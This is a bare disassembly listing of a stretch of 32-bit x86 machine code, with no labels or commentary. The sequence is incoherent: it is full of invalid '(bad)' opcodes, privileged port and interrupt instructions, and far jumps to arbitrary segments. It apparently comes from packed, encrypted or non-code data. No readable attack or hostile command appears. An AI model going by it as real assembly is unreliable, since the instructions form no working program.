  41d80f:	repz mov ds:0x3350972c,eax
  41d815:	rcl    DWORD PTR [eax+0x57c2fdc2],cl
  41d81b:	sbb    eax,0x57e3181e
  41d820:	shl    bh,0xb6
  41d823:	xor    BYTE PTR [ecx],bl
  41d825:	xchg   esp,eax
  41d826:	add    ebp,edx
  41d828:	add    al,0xdb
  41d82a:	add    BYTE PTR [ebp-0x61f9c2d7],cl
  41d830:	cmc    
  41d831:	imul   esp,edx,0xc
  41d834:	xchg   edx,eax
  41d835:	ins    BYTE PTR es:[edi],dx
  41d836:	xchg   edx,eax
  41d837:	cmp    al,0x6d
  41d839:	shl    cl,0x53
  41d83c:	xchg   ebp,eax
  41d83d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d83e:	scas   eax,DWORD PTR es:[edi]
  41d83f:	or     BYTE PTR [ebp+0xb5580cb],bl
  41d845:	xor    eax,0xc1445794
  41d84a:	mov    ch,dh
  41d84c:	cld    
  41d84d:	hlt    
  41d84e:	loopne 0x41d8a8
  41d850:	pop    ecx
  41d851:	pop    ebp
  41d852:	(bad)  
  41d853:	loop   0x41d812
  41d855:	mov    al,ds:0x87cb53ae
  41d85a:	sub    cl,bh
  41d85c:	call   FWORD PTR [ebp-0x3e]
  41d85f:	cs and bh,dh
  41d862:	lods   eax,DWORD PTR ds:[esi]
  41d863:	das    
  41d864:	add    esp,DWORD PTR [ecx+0x5f79b5d7]
  41d86a:	adc    DWORD PTR [esi-0x55a70481],esp
  41d870:	imul   esi,DWORD PTR [edi+ecx*8-0x74f00277],0xffffffc8
  41d878:	das    
  41d879:	mov    ds:0xb103cbcb,al
  41d87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d87f:	fimul  DWORD PTR [ebp+0x442b65cf]
  41d885:	jbe    0x41d901
  41d887:	pop    ebp
  41d888:	mov    ebx,0xe17fcae9
  41d88d:	stos   DWORD PTR es:[edi],eax
  41d88e:	test   BYTE PTR [esi+0x5823b266],0x65
  41d895:	push   ecx
  41d896:	loope  0x41d902
  41d898:	bound  edi,QWORD PTR [ecx]
  41d89a:	pop    ds
  41d89b:	mov    BYTE PTR [ebx-0x3f5e08ff],ch
  41d8a1:	push   es
  41d8a2:	icebp  
  41d8a3:	sub    eax,esp
  41d8a5:	stc    
  41d8a6:	fisubr WORD PTR [eax]
  41d8a8:	pop    eax
  41d8a9:	scas   eax,DWORD PTR es:[edi]
  41d8aa:	xchg   ebp,esp
  41d8ac:	(bad)  
  41d8ad:	jo     0x41d8cb
  41d8af:	xchg   ebp,eax
  41d8b0:	lea    esi,[ebx-0x50d262c3]
  41d8b6:	or     al,al
  41d8b8:	jp     0x41d8b8
  41d8ba:	ja     0x41d938
  41d8bc:	cmp    esi,ebp
  41d8be:	mov    edi,0x3f8a3808
  41d8c3:	sbb    dl,BYTE PTR [edx]
  41d8c5:	inc    ebp
  41d8c6:	cli    
  41d8c7:	(bad)  
  41d8c9:	scas   eax,DWORD PTR es:[edi]
  41d8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8cb:	mov    al,0x46
  41d8cd:	push   esi
  41d8ce:	stc    
  41d8cf:	mov    edx,0x750f9c57
  41d8d4:	(bad)
  41d8d7:	pushf  
  41d8d8:	scas   eax,DWORD PTR es:[edi]
  41d8d9:	sub    BYTE PTR [edx-0x65],al
  41d8dc:	mov    dh,0x2c
  41d8de:	ss repz and al,0xa7
  41d8e2:	call   FWORD PTR [edx+edx*4]
  41d8e5:	push   ebx
  41d8e6:	jmp    0x68ea24e
  41d8eb:	and    bl,BYTE PTR [ebx+0x32bd6a15]
  41d8f1:	iret   
  41d8f2:	or     esp,0xd728cae6
  41d8f8:	jmp    0xa5dc:0x66249c95
  41d8ff:	popf   
  41d900:	pop    edx
  41d901:	xchg   esp,eax
  41d902:	mov    ecx,0xe9acc44b
  41d907:	xchg   edx,eax
  41d908:	cdq    
  41d909:	jge    0x41d93b
  41d90b:	sti    
  41d90c:	mov    ds:0x7e8d5889,eax
  41d911:	push   cs
  41d912:	mov    ds:0xe1728fbd,eax
  41d917:	in     al,0xc3
  41d919:	outs   dx,BYTE PTR ds:[esi]
  41d91a:	push   esi
  41d91b:	mov    bl,0xf
  41d91d:	aad    0xb4
  41d91f:	mov    al,0x38
  41d921:	mov    WORD PTR [ebx+0x53d32f37],?
  41d927:	or     eax,DWORD PTR [edx]
  41d929:	inc    esi
  41d92a:	mov    eax,DWORD PTR [esp+eax*2]
  41d92d:	push   cs
  41d92e:	cmp    ebx,DWORD PTR ds:0x49a6a6d8
  41d934:	arpl   WORD PTR [edx+0x44],bx
  41d937:	fs cld 
  41d939:	pushf  
  41d93a:	dec    ecx
  41d93b:	push   eax
  41d93c:	add    ebx,DWORD PTR [esp+esi*8+0x45]
  41d940:	imul   ecx,DWORD PTR [ebp-0x4a59ca8f],0x3c
  41d947:	push   ebx
  41d948:	in     eax,dx
  41d949:	sar    BYTE PTR [esp+edx*1-0x6a537d7d],0x35
  41d951:	fcomp  QWORD PTR [edi+edx*1+0x6d]
  41d955:	jnp    0x41d9b5
  41d957:	xor    BYTE PTR ds:0x67415a67,ch
  41d95d:	jl     0x41d9da
  41d95f:	cmp    eax,0x942e2648
  41d964:	mov    eax,ds:0x9af240fd
  41d969:	(bad)  [ebp+eax*2-0x23]
  41d96d:	test   DWORD PTR [ecx-0x5ed91a23],esi
  41d973:	cld    
  41d974:	jl     0x41d9a6
  41d976:	imul   ebp,DWORD PTR [ebx-0x6d],0xffffffcc
  41d97a:	inc    edx
  41d97b:	adc    ch,BYTE PTR [edi-0x3b]
  41d97e:	cmp    eax,0x531b7407
  41d983:	or     BYTE PTR [edx],bh
  41d985:	out    0x75,eax
  41d987:	cmp    BYTE PTR [ecx+0x5ce70cfb],bh
  41d98d:	ret    
  41d98e:	jmp    0x1ac1:0xa8c18697
  41d995:	mov    cl,0xc8
  41d998:	sahf   
  41d999:	jg     0x41d9c0
  41d99b:	ss dec eax
  41d99d:	dec    edx
  41d99e:	mov    al,ds:0xf1210d04
  41d9a3:	ins    DWORD PTR es:[edi],dx
  41d9a4:	add    eax,0x8f0ef005
  41d9a9:	lods   eax,DWORD PTR ds:[esi]
  41d9aa:	xchg   BYTE PTR [ecx+0x66],ah
  41d9ad:	call   0xaf5ba167
  41d9b2:	sbb    al,0x65
  41d9b4:	or     eax,0x23dea25a
  41d9b9:	xlat   BYTE PTR ds:[ebx]
  41d9ba:	sbb    DWORD PTR [edx],eax
  41d9bc:	(bad)  
  41d9bd:	sahf   
  41d9be:	js     0x41da10
  41d9c0:	nop
  41d9c1:	sahf   
  41d9c2:	push   edx
  41d9c3:	mov    bh,0x9b
  41d9c5:	aaa    
  41d9c6:	add    al,0x3f
  41d9c8:	jo     0x41d9c9
  41d9ca:	sub    ebp,DWORD PTR [edx+ebp*1+0x119d730a]
  41d9d1:	scas   eax,DWORD PTR es:[edi]
  41d9d2:	jne    0x41d9dd
  41d9d4:	dec    ecx
  41d9d5:	push   ecx
  41d9d6:	mov    WORD PTR [edx-0x5],?
  41d9d9:	mov    edx,0x9998a310
  41d9de:	out    dx,eax
  41d9df:	sub    BYTE PTR [ebp+0x55fbd7c],0x27
  41d9e6:	out    0x59,al
  41d9e8:	ret    
  41d9e9:	aas    
  41d9ea:	cmp    ah,BYTE PTR [edx]
  41d9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ed:	iret   
  41d9ee:	adc    DWORD PTR [edx-0x57],ecx
  41d9f1:	jns    0x41da57
  41d9f3:	adc    al,0xd4
  41d9f5:	xor    esp,esi
  41d9f7:	dec    edi
  41d9f8:	push   edi
  41d9f9:	sar    BYTE PTR [ebx],0xa4
  41d9fc:	popf   
  41d9fd:	jecxz  0x41d9f4
  41d9ff:	repnz fwait
  41da01:	rcl    DWORD PTR [edi],cl
  41da03:	mov    ds:0x96631e56,al
  41da08:	lods   eax,DWORD PTR ds:[esi]
  41da09:	push   0xffffff84
  41da0b:	mov    ds:0xce2d8f36,al
  41da10:	pushf  
  41da11:	(bad)  
  41da12:	xchg   esi,eax
  41da13:	shl    BYTE PTR [ebp+0x5b6e2494],1
  41da19:	jge    0x41da34
  41da1b:	lods   al,BYTE PTR ds:[esi]
  41da1c:	sub    ch,dh
  41da1e:	jmp    0x41d9ea
  41da20:	jno    0x41da6f
  41da22:	repnz mov esp,0x83ec2df4
  41da28:	scas   eax,DWORD PTR es:[edi]
  41da29:	xchg   ebx,eax
  41da2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da2b:	sti    
  41da2c:	(bad)  
  41da2d:	dec    dx
  41da2f:	rol    DWORD PTR [ecx-0x3e4672a],1
  41da35:	stos   DWORD PTR es:[edi],eax
  41da36:	sbb    DWORD PTR [ebx-0x5561630b],ebx
  41da3c:	xor    DWORD PTR [eax+0x25],esi
  41da3f:	lahf   
  41da40:	sub    eax,0xd5dc8b6d
  41da45:	mov    esp,es
  41da47:	int3   
  41da48:	and    eax,0x202318f7
  41da4d:	mov    ebx,0x22378743
  41da52:	test   eax,0xb199e2bd
  41da57:	push   ebp
  41da58:	or     eax,0x6e95213f
  41da5d:	inc    ecx
  41da5e:	pop    eax
  41da5f:	aaa    
  41da60:	popa   
  41da61:	and    esi,0x64a8adde
  41da67:	rcl    BYTE PTR [ebx+0xf864bbf],0xde
  41da6e:	fwait
  41da6f:	add    ch,BYTE PTR [esi]
  41da71:	lds    esi,FWORD PTR [ebp-0x4c]
  41da74:	inc    esp
  41da75:	(bad)  
  41da76:	test   eax,0x5269e0d5
  41da7b:	or     al,0x5f
  41da7d:	into   
  41da7e:	ror    DWORD PTR [esi+0x3a],1
  41da81:	cmp    al,0xae
  41da83:	jmp    0x8d9:0x321353f6
  41da8a:	inc    ebx
  41da8b:	inc    edi
  41da8c:	(bad)  
  41da8d:	mov    ch,0xa9
  41da8f:	and    DWORD PTR [ebp+0x65],eax
  41da92:	mov    BYTE PTR [ecx+0x7e932d27],dh
  41da98:	sub    dl,cl
  41da9a:	push   ecx
  41da9b:	cdq    
  41da9c:	adc    dl,BYTE PTR [eax+0x5a]
  41da9f:	scas   al,BYTE PTR es:[edi]
  41daa0:	xchg   ecx,eax
  41daa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daa2:	mov    ebp,0x14c9f20
  41daa7:	adc    al,0xe3
  41daa9:	jmp    0xdc7:0xb6697015
  41dab0:	ja     0x41da6f
  41dab2:	mov    ecx,0x51d887e
  41dab7:	imul   edi,DWORD PTR [ebp+0x3],0x20
  41dabb:	mov    dl,0x18
  41dabd:	mov    ds:0x8254b4ba,al
  41dac2:	cmp    esp,DWORD PTR [edx+eax*4]
  41dac5:	add    al,0x36
  41dac7:	mov    dl,0x63
  41dac9:	push   es
  41daca:	cmp    dh,bh
  41dacc:	adc    bh,BYTE PTR [eax-0x76]
  41dacf:	dec    edx
  41dad0:	arpl   si,bp
  41dad2:	dec    ebx
  41dad3:	mov    bl,0x5b
  41dad5:	pop    esi
  41dad6:	mov    dh,0xb1
  41dad8:	xor    BYTE PTR [ebp+ebx*8+0x398712a0],cl
  41dadf:	data16 and BYTE PTR ds:0xca23759e,dl
  41dae6:	daa    
  41dae7:	push   ebx
  41dae8:	cwde   
  41dae9:	sbb    BYTE PTR [ebx],dh
  41daeb:	imul   ecx,ecx,0x170570fd
  41daf1:	ins    BYTE PTR es:[edi],dx
  41daf2:	cmp    edi,ebx
  41daf4:	jmp    0x41db56
  41daf6:	in     al,dx
  41daf7:	sbb    edi,DWORD PTR [edx]
  41daf9:	fst    DWORD PTR [ecx+0x22]
  41dafc:	test   bh,0x19
  41daff:	sahf   
  41db00:	std    
  41db01:	arpl   di,bx
  41db03:	inc    ebp
  41db04:	xlat   BYTE PTR ds:[ebx]
  41db05:	inc    ecx
  41db06:	fsubr  DWORD PTR ds:0x77604635
  41db0c:	inc    esi
  41db0d:	ins    DWORD PTR es:[edi],dx
  41db0e:	add    DWORD PTR gs:[edx+0x4a],ebp
  41db12:	mov    es,edx
  41db14:	aas    
  41db15:	dec    esi
  41db16:	cmp    BYTE PTR [ebp+eax*8+0x5c],cl
  41db1a:	mov    cl,0x0
  41db1c:	push   edx
  41db1d:	lods   eax,DWORD PTR ds:[esi]
  41db1e:	pop    eax
  41db1f:	jbe    0x41db66
  41db21:	ins    BYTE PTR es:[edi],dx
  41db22:	out    dx,al
  41db23:	(bad)  
  41db24:	cmc    
  41db25:	rol    DWORD PTR [ebx],0xd5
  41db28:	aad    0xa3
  41db2a:	mov    eax,0x77a46c58
  41db2f:	retf   
  41db30:	ins    BYTE PTR es:[edi],dx
  41db31:	fmul   QWORD PTR ds:0xbda9c14f
  41db37:	rcl    BYTE PTR [esi],0x14
  41db3a:	sbb    al,0x91
  41db3c:	call   0x3d16:0x3e3f9d29
  41db43:	(bad)  
  41db44:	gs pop esi
  41db46:	xchg   ecx,eax
  41db47:	mov    ds:0x5d0db6fb,al
  41db4c:	out    0xe3,eax
  41db4e:	jg     0x41db5c
  41db50:	push   esp
  41db51:	pusha  
  41db52:	inc    edi
  41db53:	or     BYTE PTR [ecx+0x27ee403f],cl
  41db59:	mov    eax,ds:0x297a6a32
  41db5e:	js     0x41db81
  41db60:	outs   dx,BYTE PTR ds:[esi]
  41db61:	arpl   WORD PTR [eax],dx
  41db63:	stc    
  41db64:	in     eax,0xf0
  41db66:	jmp    0x41db5f
  41db68:	rcr    DWORD PTR [eax],0x55
  41db6b:	adc    al,0xb0
  41db6d:	adc    eax,0xa58f0456
  41db72:	sahf   
  41db73:	outs   dx,BYTE PTR ds:[esi]
  41db74:	jnp    0x41db9e
  41db76:	xor    BYTE PTR [ebx+0x5f],dh
  41db79:	sti    
  41db7a:	push   es
  41db7b:	jb     0x41db3c
  41db7d:	stc    
  41db7e:	mov    ecx,0x3d114394
  41db83:	in     al,0xc8
  41db85:	inc    ebx
  41db86:	pop    ss
  41db87:	push   esp
  41db88:	daa    
  41db89:	ret    
  41db8a:	push   ebp
  41db8b:	or     DWORD PTR [esi+0x2b],ebp
  41db8e:	inc    edi
  41db8f:	lds    ebp,FWORD PTR [eax+0x48]
  41db92:	jbe    0x41dbe3
  41db94:	push   0xffffff9f
  41db96:	test   DWORD PTR [edx-0x61a008c8],edx
  41db9c:	leave  
  41db9d:	addr16 cli 
  41db9f:	jge    0x41db95
  41dba1:	loopne 0x41db6d
  41dba3:	test   eax,0xdf239a76
  41dba8:	bsr    ecx,ebp
  41dbab:	pop    edi
  41dbac:	sub    dl,BYTE PTR [esi]
  41dbae:	jecxz  0x41dbd7
  41dbb0:	pop    edi
  41dbb1:	outs   dx,DWORD PTR ds:[esi]
  41dbb2:	fiadd  WORD PTR [edi-0x421ec3a9]
  41dbb8:	pop    edx
  41dbb9:	cmp    ch,BYTE PTR [eax]
  41dbbb:	fwait
  41dbbc:	mov    ecx,DWORD PTR [ebp+0x46]
  41dbbf:	lahf   
  41dbc0:	(bad)  
  41dbc1:	mov    esi,0x9d744553
  41dbc6:	aaa    
  41dbc7:	ret    
  41dbc8:	cmp    BYTE PTR [eax-0x2],dl
  41dbcb:	cmp    dh,cl
  41dbcd:	and    eax,0xd23dc31d
  41dbd2:	xor    DWORD PTR [eax],0xffffffe6
  41dbd5:	and    al,0x66
  41dbd7:	test   DWORD PTR [ecx+esi*8-0x321b18f6],edx
  41dbde:	enter  0xd5b3,0x5
  41dbe2:	jmp    0x99899c40
  41dbe7:	push   cs
  41dbe8:	push   edx
  41dbe9:	xor    al,0xa8
  41dbeb:	or     eax,0x6e715fab
  41dbf0:	sbb    BYTE PTR [ebp+0x73],0x8f
  41dbf4:	addr16 mov dl,0x68
  41dbf7:	loop   0x41dbf5
  41dbf9:	pop    ds
  41dbfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbfb:	lahf   
  41dbfc:	je     0x41dc77
  41dbfe:	ror    DWORD PTR [ecx+0x60],1
  41dc01:	sti    
  41dc02:	loope  0x41dba8
  41dc04:	and    eax,0xc69f6725
  41dc09:	xchg   ecx,eax
  41dc0a:	add    al,0x23
  41dc0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc0d:	data16 div bl
  41dc10:	add    esp,DWORD PTR [edi+0x1f2e5bb3]
  41dc16:	aad    0x25
  41dc18:	enter  0x828d,0x4e
  41dc1c:	and    cl,BYTE PTR [ebx-0x56bdafe]
  41dc22:	jge    0x41dc1b
  41dc24:	sub    al,0xa2
  41dc26:	test   al,0xae
  41dc28:	pusha  
  41dc29:	mov    ds,WORD PTR [esi-0x502424ec]
  41dc2f:	ja     0x41dbd9
  41dc31:	inc    ebp
  41dc32:	sub    esp,eax
  41dc34:	js     0x41dc03
  41dc36:	mov    WORD PTR [edi+eax*4-0x48],gs
  41dc3a:	dec    ebp
  41dc3b:	xchg   BYTE PTR [eax+0x6],cl
  41dc3e:	jns    0x41dc57
  41dc40:	in     eax,dx
  41dc41:	fcmovnu st,st(6)
  41dc43:	push   ebx
  41dc44:	aas    
  41dc45:	jae    0x41dc5b
  41dc47:	out    dx,eax
  41dc48:	in     al,dx
  41dc49:	test   DWORD PTR [edx+ebp*4+0x4ccab956],esp
  41dc50:	sbb    al,0xa6
  41dc52:	fwait
  41dc53:	xchg   DWORD PTR ss:[ecx+0x608eefc1],esi
  41dc5a:	out    0xde,eax
  41dc5c:	(bad)  
  41dc5d:	xor    eax,0x65d2aa5d
  41dc62:	lock adc eax,0xad4473d6
  41dc68:	in     al,0x41
  41dc6a:	mov    edi,esi
  41dc6c:	fsubrp st(6),st
  41dc6e:	xor    eax,0x751b9d75
  41dc73:	sub    ecx,ebp
  41dc75:	daa    
  41dc76:	add    DWORD PTR [eax-0x4],edi
  41dc79:	enter  0x7dc0,0xcc
  41dc7d:	add    bl,BYTE PTR ss:[esi-0x38]
  41dc81:	dec    edx
  41dc82:	aaa    
  41dc83:	and    DWORD PTR [eax+0x8],eax
  41dc86:	adc    BYTE PTR [edi-0x78],bh
  41dc89:	sub    DWORD PTR [esi-0x3],esi
  41dc8c:	inc    esi
  41dc8d:	cmp    DWORD PTR [eax],edi
  41dc8f:	sahf   
  41dc90:	popa   
  41dc91:	test   BYTE PTR [ebx+0x76a75be7],ch
  41dc97:	cmp    ah,cl
  41dc99:	call   0xb07b:0x5537a49
  41dca0:	call   edx
  41dca2:	pop    edx
  41dca3:	ins    DWORD PTR es:[edi],dx
  41dca4:	xlat   BYTE PTR ds:[ebx]
  41dca5:	inc    edi
  41dca6:	fnstsw WORD PTR [eax+0x5d]
  41dca9:	sbb    ah,BYTE PTR [edx+0x6e866cc0]
  41dcaf:	mov    bl,0xc6
  41dcb1:	lock cmp al,0x5a
  41dcb4:	inc    ecx
  41dcb5:	dec    eax
  41dcb6:	stos   BYTE PTR es:[edi],al
  41dcb7:	push   ds
  41dcb8:	inc    edx
  41dcb9:	(bad)  [edi+ebx*4]
  41dcbc:	rcl    BYTE PTR [eax+0x7b7f6508],1
  41dcc2:	daa    
  41dcc3:	mov    BYTE PTR [ecx-0x575accc4],ch
  41dcc9:	push   es
  41dcca:	pushf  
  41dccb:	rol    BYTE PTR [eax],1
  41dccd:	cwde   
  41dcce:	xchg   edx,eax
  41dccf:	add    al,dl
  41dcd1:	mov    bh,0xa0
  41dcd3:	xor    DWORD PTR es:[edi],esi
  41dcd6:	mov    dh,0xbe
  41dcd8:	adc    bl,bl
  41dcda:	ret    0xb98b
  41dcdd:	lock in eax,dx
  41dcdf:	ins    DWORD PTR es:[edi],dx
  41dce0:	cs mov cl,0x42
  41dce3:	push   ebx
  41dce4:	inc    eax
  41dce5:	retf   0xe2a5
  41dce8:	pop    edi
  41dce9:	cwde   
  41dcea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dceb:	out    dx,al
  41dcec:	cmp    BYTE PTR [edx],cl
  41dcee:	push   ds
  41dcef:	xor    eax,DWORD PTR [eax]
  41dcf1:	inc    edi
  41dcf2:	jge    0x41dcf9
  41dcf4:	sbb    esp,edi
  41dcf6:	addr16 in al,0xb8
  41dcf9:	sub    BYTE PTR [edx+ebx*4+0x32],0x86
  41dcfe:	mov    al,0xe1
  41dd00:	(bad)  
  41dd01:	arpl   WORD PTR [ebp+0x338b5f6a],ax
  41dd07:	loope  0x41dd29
  41dd09:	(bad)
  41dd0e:	cmp    DWORD PTR [ebx],ebp
  41dd10:	dec    eax
  41dd11:	gs inc eax
  41dd13:	test   eax,0xbe5cb4b6
  41dd18:	sub    eax,0x2e0d18df
  41dd1d:	sahf   
  41dd1e:	mov    esp,0x157750e8
  41dd23:	jge    0x41dca5
  41dd25:	pop    ss
  41dd26:	fstp   DWORD PTR [ecx+0x54]
  41dd29:	push   esi
  41dd2a:	xor    BYTE PTR [edi-0x2c],0x48
  41dd2e:	xchg   eax,ebx
  41dd30:	mov    ds:0x44381320,eax
  41dd35:	imul   ebx,DWORD PTR [edx-0x6ce1660e],0xffffffaf
  41dd3c:	ret    
  41dd3d:	xor    al,0xa2
  41dd3f:	jp     0x41dd0b
  41dd41:	jno    0x41dd25
  41dd43:	(bad)  
  41dd45:	fadd   DWORD PTR [ebp+0x2c]
  41dd48:	inc    edi
  41dd49:	pop    edi
  41dd4a:	xchg   edi,eax
  41dd4b:	out    0x86,al
  41dd4d:	retf   
  41dd4e:	xor    eax,0x829aee84
  41dd53:	test   eax,0x9ca813e0
  41dd58:	jns    0x41dd96
  41dd5a:	sar    BYTE PTR [esi],cl
  41dd5c:	and    ebx,DWORD PTR [ecx-0x2f]
  41dd5f:	cmp    BYTE PTR [edi],cl
  41dd61:	ins    BYTE PTR es:[edi],dx
  41dd62:	lahf   
  41dd63:	icebp  
  41dd64:	and    al,0x8c
  41dd66:	add    eax,edi
  41dd68:	cs fs int 0x7a
  41dd6c:	bound  edx,QWORD PTR [edi]
  41dd6e:	jl     0x41dd45
  41dd70:	fwait
  41dd71:	mov    ds:0x2d58a888,eax
  41dd76:	sbb    esp,DWORD PTR [ebx-0xad34b0e]
  41dd7c:	jmp    0x3d84:0x138520d
  41dd83:	pop    ds
  41dd84:	adc    dl,dh
  41dd86:	inc    ebx
  41dd87:	jp     0x41ddf4
  41dd89:	or     ebp,ecx
  41dd8b:	or     BYTE PTR [edx-0x4f],al
  41dd8e:	xchg   ebp,eax
  41dd8f:	mov    dl,0x34
  41dd92:	push   esi
  41dd93:	push   ebp
  41dd94:	jne    0x41dd70
  41dd96:	jne    0x41dd74
  41dd98:	sub    eax,0x2a32ba8f
  41dd9d:	frstor [ecx+0x69b83eff]
  41dda3:	(bad)  
  41dda4:	aad    0x97
  41dda6:	data16 jno 0x41de16
  41dda9:	inc    edx
  41ddaa:	in     eax,dx
  41ddab:	call   0x4f40:0x9d0ff786
  41ddb2:	fistp  QWORD PTR [eax+ebp*1+0x5e90f50f]
  41ddb9:	inc    ebp
  41ddba:	aam    0xa7
  41ddbc:	jnp    0x41de38
  41ddbe:	retf   
  41ddbf:	mov    cs,WORD PTR [ebp+esi*4+0x89ee75]
  41ddc6:	sbb    BYTE PTR [esp+ebx*4+0x14],al
  41ddca:	(bad)  
  41ddcb:	mov    ebp,DWORD PTR [edi+0x78]
  41ddce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddcf:	jp     0x41ddde
  41ddd1:	sub    esi,DWORD PTR [eax+0x5c72fd21]
  41ddd7:	sbb    ebx,DWORD PTR ds:0x72eecf1e
  41dddd:	fucomi st,st(4)
  41dddf:	lods   eax,DWORD PTR ds:[esi]
  41dde0:	push   ds
  41dde1:	test   DWORD PTR [ecx],ebx
  41dde3:	cmovge esi,ebx
  41dde6:	cmp    al,0xc8
  41dde8:	into   
  41dde9:	arpl   si,cx
  41ddeb:	xchg   edi,eax
  41dded:	dec    esi
  41ddee:	jle    0x41dd80
  41ddf0:	mov    ah,0x68
  41ddf2:	inc    edx
  41ddf3:	mov    dh,0x8a
  41ddf5:	push   esi
  41ddf6:	gs je  0x41de0e
  41ddf9:	fdivrp st(1),st
  41ddfb:	xchg   BYTE PTR [eax],dl
  41ddfd:	push   sp
  41ddff:	add    al,0xd3
  41de01:	cmp    dl,BYTE PTR [esi+0xce83a5e]
  41de07:	fdiv   st,st(3)
  41de09:	add    DWORD PTR [ebx+0x59],ecx
  41de0c:	pop    ebx
  41de0d:	clc    
  41de0e:	outs   dx,DWORD PTR ds:[esi]
  41de0f:	enter  0xcbab,0x47
  41de13:	cmp    al,0xb9
  41de15:	add    eax,0x5b77e1d0
  41de1a:	cmc    
  41de1b:	jo     0x41ddfc
  41de1d:	loopne 0x41ddd6
  41de1f:	inc    esi
  41de20:	or     BYTE PTR [edx],bh
  41de22:	inc    esi
  41de23:	sbb    cl,ch
  41de25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de26:	fbld   TBYTE PTR [eax+0x282aebb8]
  41de2c:	addr16 push edx
  41de2e:	nop
  41de2f:	add    al,0xa0
  41de31:	imul   ebx,DWORD PTR [ecx-0x7e],0x82a14f82
  41de38:	adc    al,0xf
  41de3a:	mov    ds:0xd82d0b5f,al
  41de3f:	mov    esi,0x117099b4
  41de44:	in     eax,0x21
  41de46:	das    
  41de47:	jae    0x41deb6
  41de49:	mov    ebp,0xb3988341
  41de4e:	cmp    DWORD PTR [ebp+0x5d],ecx
  41de51:	jbe    0x41de17
  41de53:	hlt    
  41de54:	ds ffree st(4)
  41de57:	int    0xa4
  41de59:	add    al,0x1c
  41de5b:	push   0xb62c6d22
  41de60:	push   edx
  41de61:	icebp  
  41de62:	mov    al,0xc3
  41de64:	pop    eax
  41de65:	jae    0x41de67
  41de67:	(bad)  
  41de68:	jmp    0x9ea9ac98
  41de6d:	dec    ebx
  41de6e:	outs   dx,DWORD PTR ds:[esi]
  41de6f:	xor    BYTE PTR [edi-0x71f995d1],dl
  41de75:	sbb    BYTE PTR [edx],dh
  41de77:	sbb    BYTE PTR [ebp-0x1f],cl
  41de7a:	sbb    eax,0xfa780973
  41de7f:	add    al,0x3d
  41de81:	repz pushf 
  41de83:	test   al,0x41
  41de85:	inc    edi
  41de86:	(bad)  
  41de87:	sbb    esi,DWORD PTR [ecx+0x29]
  41de8a:	lock or eax,0xea3f405a
  41de90:	push   esi
  41de91:	add    BYTE PTR [ecx+eax*8-0x44155898],bl
  41de98:	lds    esi,FWORD PTR [ecx-0x4cc010f0]
  41de9e:	adc    DWORD PTR [ebx-0x16],ebp
  41dea1:	jmp    0xc216:0x1bf28e9f
  41dea8:	dec    esp
  41dea9:	sub    eax,0x62a751dd
  41deae:	leave  
  41deaf:	mov    edx,0xa84f62ca
  41deb4:	ss in  eax,0x70
  41deb7:	dec    edx
  41deb8:	idiv   DWORD PTR [ebp+0x6e]
  41debb:	das    
  41debc:	mov    bh,0x64
  41debe:	fistp  WORD PTR [edx+esi*1+0x5c049e9a]
  41dec5:	mov    WORD PTR [ebx],fs
  41dec7:	dec    ebx
  41dec8:	sbb    dh,BYTE PTR [esi+0x3c1c7a26]
  41dece:	mov    WORD PTR [eax+0x2b],fs
  41ded1:	in     al,dx
  41ded2:	imul   esp,DWORD PTR [esi],0x46
  41ded5:	or     al,ah
  41ded7:	push   cs
  41ded8:	push   DWORD PTR [edx+0x75930e81]
  41dede:	mov    cl,0xba
  41dee0:	pusha  
  41dee1:	push   cs
  41dee2:	pop    esp
  41dee3:	sub    BYTE PTR [edx+0xe],cl
  41dee6:	shr    DWORD PTR [edx+0x40],1
  41dee9:	xchg   edx,ebp
  41deeb:	stos   BYTE PTR es:[edi],al
  41deec:	mov    al,ds:0xf9bbf7a9
  41def1:	push   esp
  41def2:	lock hlt 
  41def4:	or     ebp,ebx
  41def6:	push   edi
  41def7:	fs leave 
  41def9:	jmp    0x41df3a
  41defb:	iret   
  41defc:	jno    0x41df3b
  41defe:	mov    al,0xdb
  41df00:	mov    bl,0x6c
  41df02:	pop    esi
  41df03:	fisttp WORD PTR [esi+0x4c1a9c0e]
  41df09:	push   edi
  41df0a:	leave  
  41df0b:	and    cl,BYTE PTR [edi-0x6def2327]
  41df11:	adc    esi,DWORD PTR [ecx+0x6f]
  41df14:	repz dec ebp
  41df16:	sbb    edi,DWORD PTR [eax-0x4]
  41df19:	je     0x41df3b
  41df1b:	hlt    
  41df1c:	out    dx,al
  41df1d:	pop    ds
  41df1e:	mov    al,0x28
  41df20:	test   eax,0xbe823459
  41df25:	lds    edx,FWORD PTR [ebx+ebx*2-0x319f27e3]
  41df2c:	or     bl,dh
  41df2e:	cmp    ebp,DWORD PTR [ecx+eax*1-0x284aca2a]
  41df35:	stos   BYTE PTR es:[edi],al
  41df36:	adc    al,0x69
  41df38:	imul   edx,DWORD PTR [ebx+esi*8],0xf3b71993
  41df3f:	jl     0x41df80
  41df41:	mov    DWORD PTR [esi+0x75],ebp
  41df44:	stos   BYTE PTR es:[edi],al
  41df45:	loope  0x41df02
  41df47:	in     al,0x8f
  41df49:	mov    dh,0x9
  41df4b:	mov    edx,0xa4858d0c
  41df50:	cmp    bh,BYTE PTR [esi+0x6]
  41df53:	dec    eax
  41df54:	add    al,dl
  41df56:	push   cs
  41df57:	jno    0x41df04
  41df59:	sbb    DWORD PTR fs:[edx+0x580db849],0xffffffea
  41df61:	lahf   
  41df62:	imul   esp,DWORD PTR [esi],0xda5b7c99
  41df68:	dec    esi
  41df69:	jle    0x41dfbc
  41df6b:	cli    
  41df6c:	xor    ebx,DWORD PTR [edx+0x58]
  41df6f:	pop    ebx
  41df70:	dec    ecx
  41df71:	sbb    eax,0x83ce2c
  41df76:	imul   edi,ebp,0x4f
  41df79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7a:	or     al,0xf
  41df7c:	icebp  
